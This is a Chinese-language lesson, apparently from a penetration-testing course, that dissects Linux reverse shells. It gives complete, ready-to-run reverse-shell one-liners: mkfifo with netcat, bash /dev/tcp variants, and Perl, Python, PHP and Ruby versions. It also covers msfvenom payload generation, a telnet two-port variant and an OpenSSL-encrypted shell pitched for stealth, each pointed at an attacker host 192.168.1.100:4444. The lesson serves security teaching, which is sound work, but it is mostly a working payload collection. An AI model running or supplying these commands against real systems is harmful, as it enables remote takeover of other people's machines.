## 反弹Shell命令拆解（基于mkfifo）

![](img/619f1753ab85bd18403ae5ffb41154d1_111.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_113.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_114.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_116.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_118.png)

理解了上述前置知识后，我们来看一个复杂的反弹Shell命令。以下是该命令的拆解分析：

![](img/619f1753ab85bd18403ae5ffb41154d1_120.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_122.png)

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.100 4444 > /tmp/f
```

以下是该命令的逐步解析：

![](img/619f1753ab85bd18403ae5ffb41154d1_124.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_126.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_128.png)

1.  **`rm /tmp/f`**：删除 `/tmp` 目录下的 `f` 文件，确保开始时该文件不存在。
2.  **`mkfifo /tmp/f`**：使用 `mkfifo` 命令在 `/tmp` 目录下创建一个名为 `f` 的**命名管道**文件。
    *   **命名管道**是一种特殊的文件类型（`ls -l` 显示为 `p`），用于两个进程间的通信。它可以像普通文件一样被写入和读取。
    *   向命名管道写入数据后，数据会被存储，直到被读取。一旦被读取，管道内的数据就会被消耗掉，再次读取需要重新写入。
3.  **`cat /tmp/f | /bin/sh -i 2>&1`**：
    *   `cat /tmp/f`：读取命名管道 `/tmp/f` 中的内容。
    *   `|`：管道符，将 `cat` 的输出作为下一个命令的输入。
    *   `/bin/sh -i`：启动一个交互式的Shell环境。
    *   `2>&1`：将标准错误输出（文件描述符2）重定向到标准输出（文件描述符1）。这意味着Shell执行命令产生的正确结果和错误信息都会一起输出。
    *   整体效果：从管道 `f` 读取到的内容（即攻击者输入的命令）会在交互式Shell中执行，并且执行结果（包括错误）准备输出。
4.  **`| nc 192.168.1.100 4444 > /tmp/f`**：
    *   `nc 192.168.1.100 4444`：使用netcat向攻击机（IP: 192.168.1.100）的4444端口发起TCP连接，建立数据传输通道。
    *   `>`：输出重定向。
    *   `/tmp/f`：目标文件，即我们创建的命名管道。
    *   整体效果：上一步Shell的执行结果，会通过netcat连接发送给攻击者。**同时**，攻击者通过netcat连接发送过来的命令，会被重定向写入到命名管道 `/tmp/f` 中。

![](img/619f1753ab85bd18403ae5ffb41154d1_130.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_132.png)

**工作流程闭环**：
1.  攻击者在攻击机监听4444端口：`nc -lvp 4444`。
2.  受害机执行上述反弹Shell命令。
3.  攻击者在自己的nc终端输入命令（如 `ls`）。
4.  该命令通过netcat连接传到受害机，并被写入管道 `/tmp/f`。
5.  `cat /tmp/f` 读取到 `ls` 命令，交给 `/bin/sh -i` 执行。
6.  执行结果通过 `2>&1` 合并输出，再通过管道传给 `nc`。
7.  `nc` 将结果通过TCP连接回传给攻击者的终端显示。
8.  这样就完成了一个交互式Shell的闭环：攻击者输入命令，在受害机执行，结果返回给攻击者。

![](img/619f1753ab85bd18403ae5ffb41154d1_134.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_136.png)

**类似方法**：除了 `mkfifo`，还可以使用 `mknod` 创建特殊的设备文件（块设备）来实现类似的功能，原理都是创建一个可用于读写通信的特殊文件。

![](img/619f1753ab85bd18403ae5ffb41154d1_138.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_140.png)

## Bash环境下的反弹Shell

![](img/619f1753ab85bd18403ae5ffb41154d1_142.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_144.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_146.png)

理解了复杂原理后，再看Bash下常见的反弹Shell命令就更容易了。

**1. 经典一句话反弹Shell**

```bash
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
```
这是最常用的反弹Shell命令之一。在攻击机监听4444端口后，执行此命令即可获得一个交互式Bash Shell。

![](img/619f1753ab85bd18403ae5ffb41154d1_148.png)

**2. 基于文件描述符的变体**

![](img/619f1753ab85bd18403ae5ffb41154d1_150.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_152.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_153.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_154.png)

```bash
exec 5<>/dev/tcp/192.168.1.100/4444; cat <&5 | while read line; do $line 2>&5 >&5; done
```
这条命令结合了我们前面讲的所有内容：
*   `exec 5<>/dev/tcp/...`：创建文件描述符5，并建立到攻击机的TCP连接（`/dev/tcp` 是Bash提供的用于网络通信的特殊设备文件）。
*   `cat <&5`：从文件描述符5（即TCP连接）读取数据（攻击者输入的命令）。
*   `while read line; do $line 2>&5 >&5; done`：循环读取每一行命令，执行它，并将标准输出和标准错误都重定向回文件描述符5（即TCP连接），从而将结果返回给攻击者。

![](img/619f1753ab85bd18403ae5ffb41154d1_156.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_158.png)

**3. Base64编码形式**

![](img/619f1753ab85bd18403ae5ffb41154d1_160.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_162.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_164.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_166.png)

## 反弹Shell的本质与步骤拆解

![](img/619f1753ab85bd18403ae5ffb41154d1_172.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_174.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_176.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_178.png)

一个交互式反弹Shell的本质是实现双向通信：
1.  将攻击者输入的命令传送到受害机执行。
2.  将受害机执行命令的结果返回给攻击者显示。

![](img/619f1753ab85bd18403ae5ffb41154d1_180.png)

我们可以将Bash的反弹Shell命令拆解成几个步骤来理解：

![](img/619f1753ab85bd18403ae5ffb41154d1_182.png)

**步骤1：将受害机Shell的输出重定向到攻击机**
```bash
bash -i > /dev/tcp/192.168.1.100/4444
```
受害机执行命令的结果会通过TCP连接发送给攻击机。

![](img/619f1753ab85bd18403ae5ffb41154d1_183.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_185.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_187.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_189.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_191.png)

**步骤2：将攻击机的输入重定向到受害机Shell**
```bash
bash -i < /dev/tcp/192.168.1.100/4444
```
攻击机输入的命令会通过TCP连接传给受害机的Shell执行。

![](img/619f1753ab85bd18403ae5ffb41154d1_193.png)

**步骤3：组合输入和输出（初步）**
```bash
bash -i < /dev/tcp/192.168.1.100/4444 > /dev/tcp/192.168.1.100/4444
```
这实现了双向通信，但可能不是完整的交互式TTY，且错误输出未处理。

![](img/619f1753ab85bd18403ae5ffb41154d1_195.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_197.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_199.png)

**步骤4：完整交互式反弹Shell**
```bash
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
# 或等价的
bash -i &> /dev/tcp/192.168.1.100/4444 0>&1
```
*   `>&` 或 `&>`：将标准输出和标准错误**都**重定向到后面的文件。
*   `0>&1`：将标准输入重定向到标准输出（此时标准输出已指向TCP连接）。这形成了一个闭环，使得Shell的输入也来自TCP连接。
这条命令最终实现了完全交互式的反弹Shell。

![](img/619f1753ab85bd18403ae5ffb41154d1_201.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_203.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_205.png)

## 其他语言实现的反弹Shell

![](img/619f1753ab85bd18403ae5ffb41154d1_207.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_209.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_211.png)

理解了Bash的原理后，其他语言实现的反弹Shell就很容易看懂了，它们本质都是建立Socket连接，然后重定向进程的输入输出。

![](img/619f1753ab85bd18403ae5ffb41154d1_213.png)

![](img/619f1753ab85bd18403ae5ffb41154d1_214.png)

**1. Perl**
```perl
perl -e 'use Socket;$i="192.168.1.100";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
*   使用Socket库建立TCP连接。
*   `open(STDIN,">&S")` 等行将标准输入、输出、错误都重定向到Socket连接 `S`。
*   `exec("/bin/sh -i")` 启动交互式Shell。

**2. Python**
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
*   `os.dup2(s.fileno(),0)` 将Socket的文件描述符复制到标准输入（0）。同理，1是标准输出，2是标准错误。这实现了重定向。
*   `subprocess.call(["/bin/sh","-i"])` 启动Shell。

**3. PHP**
```php
php -r '$sock=fsockopen("192.168.1.100",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```
*   `fsockopen` 建立连接。
*   `exec` 执行Shell，并使用文件描述符3（由`fsockopen`返回）进行重定向。

**4. Ruby**
```ruby
ruby -rsocket -e 'c=TCPSocket.new("192.168.1.100","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
# 或使用MSF生成：
# msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.100 lport=4444 R
```
Ruby版本通过TCPSocket建立连接，循环读取命令并执行，将结果写回Socket。

**生成Payload工具**：可以使用 `msfvenom` 工具生成各种语言的反弹Shell代码。
```bash
# 列出所有payload
msfvenom -l payloads | grep reverse
# 生成Perl反向Shell的原始代码
msfvenom -p cmd/unix/reverse_perl lhost=192.168.1.100 lport=4444 R
```

## 其他工具与方法

**1. Telnet反弹Shell**
有时需要监听两个端口，一个送命令，一个收结果。
```bash
# 攻击机
nc -lvp 4444
nc -lvp 5555
# 受害机
telnet 192.168.1.100 4444 | /bin/sh | telnet 192.168.1.100 5555
```

**2. OpenSSL加密反弹Shell**
使用OpenSSL加密通信流量，增强隐蔽性。
```bash
# 攻击机生成证书并监听
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
# 受害机连接
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.1.100:4444 > /tmp/s; rm /tmp/s
```

## 课程总结

![](img/619f1753ab85bd18403ae5ffb41154d1_222.png)

本节课中我们一起深入学习了Linux反弹Shell的多种高级实现方法。

![](img/619f1753ab85bd18403ae5ffb41154d1_224.png)

我们首先**回顾并深化**了Linux的核心概念：**文件描述符**、**输入/输出重定向**以及**管道**。我们学习了如何创建用于读写的文件描述符（`exec n<>file`），以及如何利用特殊文件 `/dev/null`。

接着，我们**重点拆解**了一个基于 `mkfifo` 命名管道的复杂反弹Shell命令，理解了其如何通过创建管道文件、结合netcat和Shell重定向，形成一个交互式命令循环。这揭示了反弹Shell的本质：**建立双向通信通道，将本地Shell的输入输出重定向到该通道**。

然后，我们**分析**了Bash环境下常见的反弹Shell命令，并将其拆解为“输出重定向到攻击机”和“输入来自攻击机”两个基本步骤，最终组合成完整的 `bash -i >& /dev/tcp/... 0>&1` 形式。这让我们从原理上而不仅仅是记忆上掌握了该命令。

最后，我们**浏览**了Perl、Python、PHP、Ruby等其他语言实现的反弹Shell，发现它们万变不离其宗，都是建立Socket连接后，通过 `dup2` 或类似调用将进程的标准输入、输出、错误重定向到该连接，最后启动一个Shell进程。

理解这些原理后，你将能够：
1.  看懂并解释绝大多数反弹Shell命令。
2.  根据目标环境灵活构造或修改反弹Shell命令。
3.  更好地理解后续课程中关于隧道、代理、加密通信等内容。
